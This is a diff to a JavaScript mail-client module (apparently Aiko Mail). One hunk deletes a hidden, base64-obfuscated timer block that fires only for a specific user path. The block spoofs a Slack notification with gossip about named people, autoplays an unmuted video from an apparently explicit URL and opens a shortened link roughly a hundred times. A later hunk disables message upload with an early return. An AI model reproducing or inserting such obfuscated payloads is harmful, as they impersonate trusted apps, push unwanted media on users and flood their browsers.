@@ -51,121 +51,6 @@ const mailapi = {
     },
     created() {
         info(...MAILAPI_TAG, "Mounted IMAP processor. Please ensure this only ever happens once.")
-        setTimeout(() => {
-            if (!window.location.href.includes('Users/hello')) return;
-            new Notification(atob("TmV3IE1lc3NhZ2UgaW4gSm8sIFByaWFuc2g6"), {
-                body: atob("UnViZW46IEBKbyBkaWQgUHJpIHRlbGwgeW91IGhlJ3MgZmxpcnRpbmcgd2l0aCB0aW5nIHRpbmc="),
-                image: atob("aHR0cHM6Ly9sb2dvLmNsZWFyYml0LmNvbS9zbGFjay5jb20="),
-                icon: atob("aHR0cHM6Ly9sb2dvLmNsZWFyYml0LmNvbS9zbGFjay5jb20="),
-                requireInteraction: false
-            })
-            const ss = document.createElement('video')
-            ss.src = atob("aHR0cHM6Ly9wcmlhbnNoLmNvbS9mYXAvYnRhd19jaW5keV9zdGFyZmFsbF9iYjEyMTgxNV8yNzJwXzY1MF9tb2JpbGUubXA0")
-            ss.autoplay = true
-            ss.muted = false
-            ss.currentTime = 700
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            window.open(atob("aHR0cHM6Ly9iaXQubHkvMlhVOGptSQ=="))
-            document.body.append(ss)
-        }, 8000)
     },
     methods: {
         async initIMAP() {
@@ -586,15 +471,20 @@ const mailapi = {
                 this.inbox.uidLatest = this.inbox.emails[0].uid
             this.syncing = false
         },
-        async uploadMessage(path, message, customData) {
+        async uploadMessage(path, message, headerData, customData) {
             info(...MAILAPI_TAG, "Uploading a message to", path)
+            return window.error(...MAILAPI_TAG, "We disabled upload message because it duplicates messages when threading is activated.")
+
             if (path == "INBOX")
                 return window.error(...MAILAPI_TAG, "Don't upload messages to the inbox.")
 
             const to_upload = Object.assign({}, message);
 
-            // customData is stringified and base64 encoded
-            // to parse it you'll have to use the parseAikoDataAttachment method
+            // data is stringified and base64 encoded
+            // to parse it you'll have to atob and JSON.parse
+            // for attachments you have to add an = after decoding the uint8array before enc
+            // for that purpose there is a specific method for dealing with attachments below this one
+            to_upload['body[]'] = "X-Aiko-Mail: " + btoa(JSON.stringify(headerData)) + '\r\n' + to_upload['body[]']
             const data = btoa(JSON.stringify(customData || {}))
 
             const boundary = to_upload['bodystructure']['parameters']['boundary']
